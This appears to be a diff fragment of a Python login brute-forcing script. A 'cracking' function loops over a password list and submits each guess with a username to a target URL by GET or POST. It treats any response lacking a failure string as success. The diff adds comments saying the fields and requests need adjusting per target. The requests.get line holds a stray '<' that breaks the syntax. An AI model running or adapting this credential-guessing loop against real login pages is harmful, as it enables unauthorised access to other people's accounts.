@@ -12,11 +12,11 @@ def cracking(username, url)
     for password in passwords:
         password = password.strip()
         print('Trying: ' + password)
-        data = {'username':username,'password':password,'Login':'submit'}
-        if cookie_value != '':
-            response = requests.get(url, params = {'username':username,'password':password,'Login':'Login'}, < cookies = {'Cookie': cookie_value})
+        data = {'username':username,'password':password,'Login':'submit'} #fields require modification per target
+        if cookie_value != '': 
+            response = requests.get(url, params = {'username':username,'password':password,'Login':'Login'}, < cookies = {'Cookie': cookie_value}) #fields & request.get require modification per target
         else:
-            response = requests.post(url, data=data)
+            response = requests.post(url, data=data) #request.post requires modification per target
         if login_failed_string in response.content.decode():
             pass
         else:
